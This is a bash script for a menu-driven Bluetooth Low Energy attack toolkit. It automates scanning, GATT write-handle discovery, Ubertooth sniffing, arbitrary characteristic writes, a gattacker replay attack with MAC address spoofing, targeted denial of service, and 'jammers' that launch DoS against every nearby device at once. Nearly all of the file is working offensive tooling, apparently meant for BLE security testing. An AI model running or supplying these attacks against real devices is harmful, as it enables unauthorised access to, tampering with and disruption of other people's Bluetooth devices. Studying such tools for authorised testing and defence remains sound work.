#!/bin/bash
bash ./banner.sh

r='\033[0;31m'
w='\033[1;37m'
nc='\033[0m'
g='\033[0;32m'

##############################################################################

echo -e ${w}

echo "Checking for BLE adapter..."

temp_hci=$(hciconfig | grep 'hci')

echo "----------------------------"

if [[ $temp_hci == hci* ]]; then
  echo -e "\nThe BLE adapter is connected."
else
  echo -e "${r}Please connect the BLE adapter and try again.${w}"
  sleep 3
  for i in {5..1}
  do
    printf "${r}Application will close in $i\r${w}" && sleep 1
  done
  clear
  exit 1
fi

sleep 1


##############################################################################

dir=$(pwd)
mkdir txtfiles

function ble_scan()
{

cd txtfiles/
sudo hciconfig hci0 down
sudo hciconfig hci0 up
sudo hcitool lescan > tempscan.txt & sleep 2 2> /dev/null
sleep 3
#cat tempscan.txt
sudo pkill hcitool 2> /dev/null

#Removing first and last line
sed '1,1d' tempscan.txt > tempscan1.txt
rm tempscan.txt
sed '$d' tempscan1.txt > tempscan.txt
rm tempscan1.txt
sort -u tempscan.txt > devicelist.txt
sort -u tempscan.txt | awk '{print $1}' > address.txt
cd ..

}

function clean_scanfiles()
{

cd txtfiles
sudo rm tempscan.txt devicelist.txt address.txt
cd ..

}

##############################################################################


echo -e "\n"
echo -e "\n"
echo -e "\n"


######################################################################################
var=0;
while [ $var -ne 8 ];
do


columns=$(tput cols)
att1="[1] Illegal access      ( Write handles )"
att2="[2] Sniffing            ( Value format  )"
att3="[3] Write Values                         "
att4="[4] Replay attack                        "
att5="[5] Denial of Service                    "
att6="[6] Ble Jammer 1                         "
att7="[7] BLE Jammer 2                         "
exit="[8] Exit                                 "

printf "%*s\n" $(((${#att1}+$columns)/2)) "$att1"
printf "%*s\n" $(((${#att2}+$columns)/2)) "$att2"
printf "%*s\n" $(((${#att3}+$columns)/2)) "$att3"
printf "%*s\n" $(((${#att4}+$columns)/2)) "$att4"
printf "%*s\n" $(((${#att5}+$columns)/2)) "$att5"
printf "%*s\n" $(((${#att6}+$columns)/2)) "$att6"
printf "%*s\n" $(((${#att7}+$columns)/2)) "$att7"
printf "%*s\n" $(((${#exit}+$columns)/2)) "$exit"

echo -e "\n\n"
echo -e -n "Enter your choice [] :  "
read var
sleep 1


######################################################################################

#Illegal Access

if [ $var -eq 1 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n\n"

  echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
  read att1_dev
  att1_addr=$(cat tempscan.txt | grep -m 1 $att1_dev | awk '{print $1}')
  echo -e "\nThe address of the selected device is "
  echo $att1_addr

  sudo hciconfig hci0 down
  sudo hciconfig hci0 up

  echo -e "\n\n"

  echo -e "\nListing out all primary\n\n"
  sudo gatttool -b $att1_addr --primary

  echo -e "\n\n"

  echo -e "\nListing out all characteristics\n\n"
  sudo gatttool -b $att1_addr --characteristics

  echo -e "\n\n"

  #Storing the primary in a text file

  sudo gatttool -b $att1_addr --primary > tempprimary.txt & sleep 2 && pkill gatttool 2> /dev/null


  #Storing the characteristics in a text file

  sudo gatttool -b $att1_addr --characteristics > tempcharacteristics.txt & sleep 2 && pkill gatttool 2> /dev/null


  #Creating a file to store all write handles
  touch write_handles.txt



  #Reading all primary handles

  echo -e "\n\n"
  echo -e "Reading all the primary handles"
  echo -e "\n\n"
  for i in $(cat tempprimary.txt); do
    temp_var=$(echo $i | grep -o "0x....")
    if [ -z "$temp_var" ]
    then
      true
    else
      echo -e "\n Handle: $temp_var"
      sudo gatttool -b $att1_addr --char-read -a $temp_var

      equation=$(sudo gatttool -b $att1_addr --char-read -a $temp_var 2>&1)
      check=$(echo $equation | grep -o "Attribute can't be read")
      if [ -z "$check" ]
      then
        true
      else
        echo $temp_var > write_handles.txt
      fi

      echo -e "\n\n"
    fi
  done


  #Reading all characteristics handles

  echo -e "\n\n"
  echo -e "Reading all the characteristics handles"
  echo -e "\n\n"
  for i in $(cat tempprimary.txt); do
    temp_var=$(echo $i | grep -o "0x....")
    if [ -z "$temp_var" ]
    then
      true
    else
      echo -e "\n Handle: $temp_var"
      sudo gatttool -b $att1_addr --char-read -a $temp_var

      equation=$(sudo gatttool -b $att1_addr --char-read -a $temp_var 2>&1)
      check=$(echo $equation | grep -o "Attribute can't be read")
      if [ -z "$check" ]
      then
        true
      else
        echo $temp_var > write_handles.txt
      fi

      echo -e "\n\n"
    fi
  done

  echo -e "${g}"
  echo -e "\n\n"
  echo -e "The write handles are,\n"
  cat write_handles.txt
  echo -e "\n\n"
  echo -e "${w}"


  cd ..

  #clean the scan files
  clean_scanfiles


######################################################################################

#Sniffing

elif [ $var -eq 2 ]
then

  att2_check=$(lsusb | grep 'OpenMoko')

  if [[ $att2_check == Bus* ]]
  then

    #Performing BLE scan
    ble_scan

    cd txtfiles/
    cat devicelist.txt
    echo -e "\n"
    echo -e "\n"

    echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
    read att2_dev
    att2_addr=$(cat tempscan.txt | grep -m 1 $att2_dev | awk '{print $1}')
    echo -e "\nThe address of the selected device is "
    echo $att2_addr


    tput sc
    # Change scroll region to exclude first line
    tput csr 1 $((`tput lines` - 1))
    # Move to upper-left corner
    tput cup 0 0
    # Clear to the end of the line
    tput el
    # Create a header row
    echo -e "$(tput setaf 1)$(tput setab 7)Press Ctrl + c to stop sniffing$(tput sgr 0)"
    # Restore cursor position
    tput rc

    sleep 2
    ubertooth-btle -f -t $att2_addr -c sniffed.pcap
    clear
    echo -e "\n\nThe captured file is stored as sniffed.pcap"
    tshark -V -r sniffed.pcap -Y btatt > dummy.txt
    echo -e "${g}"
    echo -e "\n\nThe sniffed values are, \n"
    grep '^    Value' dummy.txt
    echo -e "${w}"
    cd ..

    #clean the scan files
    clean_scanfiles

  else

    echo -e "\n\n"
    echo -e "The Ubertooth is not connected !!"

  fi


######################################################################################


#Write Values

elif [ $var -eq 3 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"

  echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
  read att3_dev
  att3_addr=$(cat tempscan.txt | grep -m 1 $att3_dev | awk '{print $1}')

  clear

  echo -e "\n\n"
  echo -e "The write handles are,\n"
  cat write_handles.txt
  echo -e "\n\n"

  echo -e -n "Enter the write handle : "
  read att3_handle

  clear

  echo -e "\n\nThe sniffed values are, \n"
  grep '^    Value' dummy.txt

  echo -e "\n\n"
  echo -e -n "Enter an input value : "
  read att3_value
  echo -e "\n${g}"
  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value
  echo -e "${w}"

  cd ..

  #clean the scan files
  clean_scanfiles



######################################################################################

elif [ $var -eq 4 ]
then

  clear

  echo -e "\n\n"
  echo -e "${w}Make sure the slave machine is running                     <-------------------"
  echo -e "${w}\nand is in the same network as the host                   <-------------------"
  echo -e "\n\n"

  defaultaddr="00:1a:7d:da:71:13"

  echo -e "${w}Setting default address for BLE adapter"
  cd
  cd Downloads/bdaddrtar/bdaddr/
  make
  sudo ./bdaddr -i hci0 $defaultaddr

  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)Re-plug the interface and hit enter$(tput sgr 0)"
  read

  cd
  cd node_modules/gattacker

  #for MAC spoofing - device address to the BLE adapter

  cd helpers/bdaddr/
  make
  cd ..
  cd ..

  #modify config.env
  #nano config.env

  echo -e "${w}Capturing advertisement packets"
  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)Press Ctrl + c to stop sniffing$(tput sgr 0)"
  echo -e "\n\n"

  trap "${w}Terminated!!" SIGINT SIGTERM
  sudo node scan

  echo -e "\n\n${w}"

  cd
  cd $dir  cd ..

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"

  echo -e -n "${w}Enter the first 3 characters of the device you want to connect with :  "
  read att4_dev
  att4_addr=$(cat tempscan.txt | grep -m 1 $att4_dev | awk '{print $1}')
  att4_temp=$(echo "${att4_addr//:}")
  replay_addr=$(echo "${att4_temp,,}")

  cd
  cd node_modules/gattacker/
  echo -e "${w}"
  sudo node scan $replay_addr

  cd devices
  replay_adv=$(ls | grep $replay_addr | grep .adv.json)
  replay_srv=$(ls | grep $replay_addr | grep .srv.json)
  cd ..

  clear

  echo -e "Restart the \"bluetooth\" on the slave machine by typing this in a new terminal (slave machine),"
  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl stop bluetooth$(tput sgr 0)"
  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl start bluetooth$(tput sgr 0)"
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)And then press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"


  #on raspberry pi - slave - in another terminal
  #sudo systemctl stop bluetooth
  #sudo systemctl start bluetooth

  clear

  echo -e "\n\n"
  #on host
  echo -e -n "$(tput setaf 1)$(tput setab 7)Now restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,$(tput sgr 0)"
  echo -e "\n\n"
  echo -e -n "${w}Press Ctrl + c                          <---------------------------------"

  echo -e "\n\n"

  sudo systemctl stop bluetooth
  sudo ./mac_adv -a devices/$replay_adv -s devices/$replay_srv

  clear

  echo -e "\n\n"

  echo -e "$(tput setaf 1)$(tput setab 7)Again restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,"
  echo -e "\n\n"
  echo -e -n "Connect your mobile application with the device and do some valid transactions.$(tput sgr 0)"

  echo -e "\n\n"

  echo -e -n "$(tput setaf 1)$(tput setab 7)Once you are done, Press Ctrl + C to terminate it.$(tput sgr 0)"
  echo -e "\n\n${w}"
  sudo systemctl stop bluetooth
  sudo ./mac_adv -a devices/$replay_adv -s devices/$replay_srv

  clear

  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)For the last time !!  Restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read


  echo -e "\n\n${w}"
  read -p "Do you want to change the log file? (y/n) : " log_edit

  if [[ $log_edit == y ]]
  then
    cd dump
    sudo nano $replay_addr.log
    cd ..
    echo -e "\n\n"
    echo -e "Replaying the modified log file"
  else
    echo -e "Replaying the saved log file"
  fi


  echo -e "\n\n"

  sudo node replay.js -i dump/$replay_addr.log -p $replay_addr -s devices/$replay_srv

  echo -e "\n\n"

  echo -e "${g}Replay attack was successfull !!${w}"

  cd devices/
  rm -rf *
  cd ..

  cd dump/
  rm -rf *
  cd ..


  cd
  cd $dir

  echo -e "\n\n"




######################################################################################


#DoS Attack

elif [ $var -eq 5 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"

  echo -e -n "Enter the first 3 characters of the device you want to connect with:  "
  read att5_dev
  att5_addr=$(cat tempscan.txt | grep -m 1 $att5_dev | awk '{print $1}')
  cd ..

  python test_dos.py $att5_addr


  #clean the scan files
  clean_scanfiles


######################################################################################

#BLE Jammer 1
#DoS every available device

elif [ $var -eq 6 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/

  for i in $(cat address.txt)
  do
    gnome-terminal --tab -- python $dir/test_dos.py $i
  done

  echo -e "DoS attack is running on every active device - Check the terminal tabs"

  echo -e "\n\n"
  cd ..

  #clean the scan files
  clean_scanfiles

######################################################################################

#BLE Jammer 2

elif [ $var -eq 7 ]
then
  cd txtfiles/
  hciconfig | grep hci | awk '{print $1}' > interfaces.txt
  for line in $(cat interfaces.txt)
  do
  interface=$line
  interface=${interface%?}
  bash advertise.sh $interface
  done
  rm  interfaces.txt
  cd ..

######################################################################################
#Exit
elif [ $var -eq 8 ]
then
  rm -rf txtfiles/
  pkill python
  for i in {3..1}
    do
      printf "Application will close in $i\r" && sleep 1
    done
    clear
    exit 1

fi

######################################################################################

done
